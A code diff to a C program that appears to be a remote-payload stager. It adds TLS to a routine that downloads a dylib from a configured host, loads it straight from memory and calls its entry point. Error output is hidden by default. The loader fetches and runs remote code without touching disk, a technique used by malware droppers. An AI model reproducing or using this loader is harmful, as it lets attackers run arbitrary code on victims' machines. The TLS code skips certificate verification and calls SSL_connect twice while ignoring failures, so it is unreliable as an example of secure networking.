@@ -11,6 +11,9 @@
 #include <fcntl.h>
 #include <dlfcn.h>
 #include <signal.h>
+#include <openssl/ssl.h>
+#include <openssl/err.h>
+#include <openssl/bio.h>
 
 #define BUFFER_SIZE 4096
 
@@ -87,19 +90,27 @@ int create_socket(const char *hostname, int port) {
     return sockfd;
 }
 
-void send_http_get_request(int sockfd, const char *hostname, const char *path) {
+// void send_http_get_request(int sockfd, const char *hostname, const char *path) {
+//     char request[1024];
+//     snprintf(request, sizeof(request),
+//              "GET %s HTTP/1.1\r\n"
+//              "Host: %s\r\n"
+//              "Connection: close\r\n\r\n",
+//              path, hostname);
+//     send(sockfd, request, strlen(request), 0);
+// }
+
+void send_ssl_get_request(SSL *ssl, const char *hostname, const char *path) {
     char request[1024];
     snprintf(request, sizeof(request),
              "GET %s HTTP/1.1\r\n"
              "Host: %s\r\n"
              "Connection: close\r\n\r\n",
              path, hostname);
-    send(sockfd, request, strlen(request), 0);
+    SSL_write(ssl, request, strlen(request));
 }
 
-struct Memory download_dylib(const char *hostname, const char *path, int sockfd) {
-    send_http_get_request(sockfd, hostname, path);
-
+struct Memory download_dylib(const char *hostname, const char *path, SSL* ssl) {
     struct Memory mem = {0};
 
     char buffer[BUFFER_SIZE];
@@ -107,7 +118,8 @@ struct Memory download_dylib(const char *hostname, const char *path, int sockfd)
 
     int header_parsed = 0;
 
-    while ((bytes_read = recv(sockfd, buffer, sizeof(buffer), 0)) > 0) {
+    // while ((bytes_read = recv(sockfd, buffer, sizeof(buffer), 0)) > 0) {
+    while ((bytes_read = SSL_read(ssl, buffer, sizeof(buffer))) > 0) {
         if (!header_parsed) {
             char *header_end = strstr(buffer, "\r\n\r\n");
             if (header_end) {
@@ -119,7 +131,6 @@ struct Memory download_dylib(const char *hostname, const char *path, int sockfd)
                     #ifdef VERBOSE
                     perror("malloc failed");
                     #endif
-                    close(sockfd);
                     exit(1);
                 }
                 memcpy(mem.data, header_end + 4, content_size);
@@ -133,7 +144,6 @@ struct Memory download_dylib(const char *hostname, const char *path, int sockfd)
                 #ifdef VERBOSE
                 perror("realloc failed");
                 #endif
-                close(sockfd);
                 exit(1);
             }
             memcpy(mem.data + mem.size, buffer, bytes_read);
@@ -147,7 +157,6 @@ struct Memory download_dylib(const char *hostname, const char *path, int sockfd)
         #endif
     }
 
-    close(sockfd);
     return mem;
 }
 
@@ -199,14 +208,63 @@ int main() {
     int port = PORT;
     int sockfd = create_socket(hostname, port);
 
-    DEBUG_PRINT("Downloading dylib from http://%s%s...\n", hostname, path);
-    struct Memory mem = download_dylib(hostname, path, sockfd);
+    // OpenSSL is gross, thanks https://github.com/angstyloop/c-web/blob/main/openssl-fetch-example.c
+    OpenSSL_add_all_algorithms();
+    ERR_load_crypto_strings();
+    SSL_load_error_strings();
+
+    BIO* certbio = BIO_new(BIO_s_file());
+    BIO* outbio = BIO_new_fp(stdout, BIO_NOCLOSE);
+
+    if (SSL_library_init() < 0) {
+        #ifdef VERBOSE
+        BIO_printf(outbio, "Could not initialize the OpenSSL library !\n");
+        #endif
+    }
+
+    const SSL_METHOD* method = TLS_client_method();
+
+    SSL_CTX* ctx = SSL_CTX_new(method);
+    if (!ctx) {
+        #ifdef VERBOSE
+        BIO_printf(outbio, "Unable to create a new SSL context.\n");
+        #endif
+    }
+
+    SSL* ssl = SSL_new(ctx);
+    if (!ssl) {
+        #ifdef VERBOSE
+        BIO_printf(outbio, "Unable to create a new SSL structure.\n");
+        #endif
+    }
+
+    SSL_set_fd(ssl, sockfd);
+    if (SSL_connect(ssl) != 1) {
+        #ifdef VERBOSE
+        BIO_printf(outbio, "Error: Could not connect the SSL object with a file descriptor\n");
+        #endif
+    }
+
+    if (SSL_connect(ssl) < 1) {
+        #ifdef VERBOSE
+        BIO_printf(outbio, "Error: Could not build a SSL session to: %s.\n", hostname);
+        #endif
+    } else {
+        #ifdef VERBOSE
+        const char *version = SSL_get_version(ssl);
+        BIO_printf(outbio, "Successfully enabled %s session to: %s.\n", version, hostname);
+        #endif
+    }
+
+    DEBUG_PRINT("Downloading dylib from https://%s:%d%s...", hostname, port, path);
+    send_ssl_get_request(ssl, hostname, path);
+    struct Memory mem = download_dylib(hostname, path, ssl);
     if (mem.data == NULL || mem.size == 0) {
         DEBUG_FPRINTF(stderr, "Failed to download the dylib\n");
         return 1;
     }
 
-    DEBUG_PRINT("Downloaded %lu bytes\n", mem.size);
+    DEBUG_PRINT("Downloaded %lu bytes", mem.size);
 
     void *handle = load_dylib_from_memory(&mem);
     if (!handle) {
@@ -219,10 +277,16 @@ int main() {
     if (!ENTRY_POINT_FUNC) {
         DEBUG_FPRINTF(stderr, "dlsym failed: %s\n", dlerror());
     } else {
-        DEBUG_PRINT("Calling the function from the dylib...\n");
+        DEBUG_PRINT("Calling the function \"%s\" from the dylib...", ENTRY_POINT);
         ENTRY_POINT_FUNC();
     }
 
+
+    SSL_free(ssl);
+    SSL_CTX_free(ctx);
+    BIO_free_all(certbio);
+    BIO_free(outbio);
+    close(sockfd);
     dlclose(handle);
     free(mem.data);
     return 0;
